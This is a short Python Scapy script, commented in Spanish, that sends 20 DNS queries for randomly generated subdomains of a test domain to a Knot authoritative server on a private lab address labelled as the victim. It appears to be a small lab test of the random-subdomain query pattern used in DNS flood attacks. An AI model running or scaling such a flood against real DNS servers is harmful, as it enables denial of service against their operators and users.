from scapy.all import *
import random
import string
import time

# Configuración
victim_ip = "172.20.0.2"       # IP de tu servidor autoritativo (Knot)
dns_port = 53                  # Puerto DNS estándar
domain = "example.test"        # Dominio bajo tu control
num_queries = 20               # Número de consultas a enviar
interval = 0.5                 # Intervalo entre consultas en segundos
label_length = 12              # Longitud del subdominio generado (ajusta para aumentar entropía)

def random_label(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def send_dns_query():
    label = random_label(label_length)
    full_domain = f"{label}.{domain}"
    pkt = IP(dst=victim_ip)/UDP(sport=RandShort(), dport=dns_port)/DNS(
        rd=1,
        qd=DNSQR(qname=full_domain, qtype="A")
    )
    send(pkt, verbose=0)
    print(f"Sent DNS query for {full_domain}")

# Ejecutar envío repetido
for _ in range(num_queries):
    send_dns_query()
    time.sleep(interval)
